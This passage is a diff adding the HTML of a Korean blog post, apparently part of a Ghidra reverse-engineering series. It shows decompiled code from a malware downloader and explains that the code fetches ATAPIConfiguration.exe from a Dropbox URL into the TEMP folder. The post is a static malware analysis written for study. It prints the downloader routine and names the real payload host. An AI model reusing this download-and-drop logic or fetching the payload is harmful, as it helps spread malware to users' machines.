+        uVar6 = &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;;
+        pCVar7 = DAT_0041602c;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uVar6 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+          uVar6 = uVar6 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+          cVar1 = *pCVar7;
+          pCVar7 = pCVar7 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (cVar1 != &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\0&amp;apos;&lt;/span&gt;);
+        puVar5 = (undefined4 *)(DAT_0041602c + (~uVar6 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;));
+        *puVar5 = &lt;span class=&#34;hljs-number&#34;&gt;0x4154415c&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x6f434950&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x6769666e&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x74617275&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x2e6e6f69&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x657865&lt;/span&gt;;
+        MultiByteToWideChar(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,DAT_0041602c,&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;,download_path,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        CreateFileW_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateFileW&amp;quot;&lt;/span&gt;);
+                    &lt;span class=&#34;hljs-comment&#34;&gt;/* GENERIC_READ | GENERIC_WRITE */&lt;/span&gt;
+        local_48 = (HANDLE)(*CreateFileW_addr)(download_path,&lt;span class=&#34;hljs-number&#34;&gt;0xc0000000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        local_60 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        InternetReadFile_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetReadFile&amp;quot;&lt;/span&gt;);
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        WriteFile_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;WriteFile&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_38 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+          local_64 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+          &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;( &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt; ) {
+            iVar4 = (*InternetReadFile_addr)(hInternet,local_3c,&lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;,&amp;amp;local_64);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((iVar4 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) || (local_64 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!bVar2) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+            (*WriteFile_addr)(local_48,local_3c,local_64,&amp;amp;local_60,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+          }
+          hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          InternetCloseHandle_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetCloseHandle&amp;quot;&lt;/span&gt;);
+          CloseHandle(local_48);
+          (*InternetCloseHandle_addr)(local_18);
+          (*InternetCloseHandle_addr)(hConnect);
+          (*InternetCloseHandle_addr)(hInternet);
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        }
+      }
+    }
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar3;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xB9CE;&amp;#xC774; &amp;#xAE30;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C;&amp;#xBD80;&amp;#xD130; &amp;#xB0B4;&amp;#xB824;&amp;#xAC00; &amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2019.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;HttpOpenRequestW&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration&lt;/code&gt;&amp;#xC5D0; &amp;#xC5F0;&amp;#xACB0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2020.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;TEMP &amp;#xD3F4;&amp;#xB354;&amp;#xC758; &amp;#xACBD;&amp;#xB85C;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD560; &amp;#xACBD;&amp;#xB85C;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADFC;&amp;#xB370; hex&amp;#xB85C; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xAE30; &amp;#xC5B4;&amp;#xB835;&amp;#xB124;&amp;#xC694;. &amp;#xB514;&amp;#xC2A4; &amp;#xC5B4;&amp;#xC148;&amp;#xBE14; &amp;#xCC3D;&amp;#xC5D0;&amp;#xC11C; Conver &amp;#x2192; Char Sequence&amp;#xB85C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC778;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2021.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;\\ATAPIConfiguration.exe\0&lt;/code&gt;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xC81C; &amp;#xACBD;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD588;&amp;#xC73C;&amp;#xB2C8; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC77D;&amp;#xC5B4;&amp;#xC640; &amp;#xD574;&amp;#xB2F9; &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2022.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBE59;&amp;#xACE0;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xBA74; &lt;code&gt;download_ATAPIConfiguration()&lt;/code&gt;&amp;#xC740; &lt;code&gt;dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xC18D;&amp;#xD574;&amp;#xC11C; &lt;code&gt;%TEMP%\ATAPIConfiguration.exe&lt;/code&gt;&amp;#xB85C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD55C;&amp;#xB2E4;!&lt;/p&gt;
+&lt;h1 id=&#34;to-be-continued&amp;#x2026;&#34;&gt;&lt;a href=&#34;#to-be-continued&amp;#x2026;&#34; class=&#34;headerlink&#34; title=&#34;to be continued&amp;#x2026;&#34;&gt;&lt;/a&gt;to be continued&amp;#x2026;&lt;/h1&gt;&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; ATAPIConfiguration&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xB2E4;&amp;#xB904;&amp;#xBCFC; &amp;#xC608;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6D0;&amp;#xB798; &amp;#xD55C; &amp;#xAE00;&amp;#xC5D0; &amp;#xBAA8;&amp;#xB450; &amp;#xB2E4; &amp;#xB2F4;&amp;#xC73C;&amp;#xB824; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xB9CE;&amp;#xC774; &amp;#xAE38;&amp;#xC5B4;&amp;#xC84C;&amp;#xB124;&amp;#xC694;. &amp;#xB2E4;&amp;#xB978; &amp;#xBD84;&amp;#xC11D;&amp;#xC740; &amp;#xBAA8;&amp;#xB450; &amp;#xC81C;&amp;#xC678;&amp;#xD558;&amp;#xACE0; ghidra&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &amp;#xC815;&amp;#xC801; &amp;#xBD84;&amp;#xC11D;&amp;#xB9CC; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB77C; &amp;#xD2C0;&amp;#xB9B0; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD560; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xADF8;&amp;#xB7FC; &amp;#xCD5C;&amp;#xB300;&amp;#xD55C; &amp;#xBE68;&amp;#xB9AC; &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xB97C; &amp;#xC900;&amp;#xBE44;&amp;#xD574;&amp;#xC624;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &amp;#xBAA8;&amp;#xB450; &amp;#xC548;&amp;#xB155;~&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="/thumbnail.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">
@@ -764,9 +1271,9 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/malware/">malware</a>
-                  
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
+                  
+                  <a class="hover-with-bg" href="/tags/malware/">malware</a>
                   
                   <a class="hover-with-bg" href="/tags/reversing/">reversing</a>
                   
